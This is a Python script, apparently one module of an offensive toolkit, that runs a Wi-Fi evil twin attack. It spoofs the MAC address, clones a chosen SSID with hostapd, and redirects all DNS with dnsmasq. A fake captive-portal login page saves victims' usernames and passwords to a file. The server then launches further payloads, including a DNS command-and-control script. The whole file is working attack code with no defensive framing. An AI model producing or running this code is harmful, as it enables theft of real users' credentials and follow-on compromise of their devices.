#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import argparse
import random
from datetime import datetime

def generate_mac():
    return "02:00:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(4))

def get_recon_ssids():
    recon_file = "output/wifi_recon/ssids.txt"
    if os.path.exists(recon_file):
        with open(recon_file) as f:
            return [line.strip() for line in f if line.strip()]
    return []

def write_configs(ssid, iface, output_dir):
    hostapd = f"""
interface={iface}
driver=nl80211
ssid={ssid}
channel=6
hw_mode=g
auth_algs=1
ignore_broadcast_ssid=0
    """
    dnsmasq = f"""
interface={iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
    """
    index_html = f"""
<html>
  <body>
    <h2>{ssid} Wi-Fi Login</h2>
    <form method="POST" action="/login">
      Username: <input type="text" name="user"><br>
      Password: <input type="password" name="pass"><br>
      <input type="submit" value="Login">
    </form>
  </body>
</html>
    """
    os.makedirs(f"{output_dir}/portal", exist_ok=True)
    with open(f"{output_dir}/hostapd.conf", "w") as f: f.write(hostapd)
    with open(f"{output_dir}/dnsmasq.conf", "w") as f: f.write(dnsmasq)
    with open(f"{output_dir}/portal/index.html", "w") as f: f.write(index_html)

def launch_flask_server(output_dir):
    flask_code = f"""
from flask import Flask, request
import os
app = Flask(__name__)
@app.route('/')
def index():
    return open('{output_dir}/portal/index.html').read()
@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('user')
    password = request.form.get('pass')
    with open('{output_dir}/creds.txt', 'a') as f:
        f.write(f"{{user}}:{{password}}\\n")
    os.system("bash modules/payloads/watering_loop.sh &")
    os.system("python3 modules/payloads/dns_c2.py --cmd whoami &")
    return "Invalid credentials"
app.run(host='0.0.0.0', port=80)
    """
    with open(f"{output_dir}/app.py", "w") as f: f.write(flask_code)
    subprocess.Popen(["python3", f"{output_dir}/app.py"])

def spoof_mac(interface):
    subprocess.call(["ifconfig", interface, "down"])
    new_mac = generate_mac()
    subprocess.call(["macchanger", "-m", new_mac, interface])
    subprocess.call(["ifconfig", interface, "up"])
    return new_mac

def start_attack(ssid, iface, stealth):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"/tmp/wifi_twin_{timestamp}"
    os.makedirs(output_dir, exist_ok=True)

    print(f"[+] Preparing Evil Twin attack on SSID: {ssid}")
    if stealth:
        print("[*] Enabling stealth mode (MAC randomization)")
        new_mac = spoof_mac(iface)
        print(f"[+] New MAC for {iface}: {new_mac}")

    write_configs(ssid, iface, output_dir)
    print("[+] Starting captive portal server...")
    launch_flask_server(output_dir)
    time.sleep(1)
    print("[+] Launching hostapd...")
    subprocess.Popen(["hostapd", f"{output_dir}/hostapd.conf"], stdout=subprocess.DEVNULL)
    print("[+] Launching dnsmasq...")
    subprocess.Popen(["dnsmasq", "-C", f"{output_dir}/dnsmasq.conf"], stdout=subprocess.DEVNULL)

    print(f"[✓] Evil Twin running on {iface}. Credentials saved in {output_dir}/creds.txt")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Wi-Fi Evil Twin Attack Module")
    parser.add_argument("--iface", default="wlan1mon", help="Wireless interface (monitor mode)")
    parser.add_argument("--auto", action="store_true", help="Run fully automated mode")
    parser.add_argument("--ssid", help="Specify SSID manually")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth MAC spoofing")
    args = parser.parse_args()

    ssid = args.ssid
    if not ssid and not args.auto:
        options = get_recon_ssids()
        if options:
            print("Choose SSID from recon:")
            for idx, val in enumerate(options):
                print(f"{idx+1}) {val}")
            choice = int(input("Enter number or 0 for manual: "))
            if choice > 0 and choice <= len(options):
                ssid = options[choice - 1]
            else:
                ssid = input("Enter SSID manually: ")
        else:
            ssid = input("Enter SSID manually: ")

    start_attack(ssid, args.iface, args.stealth)
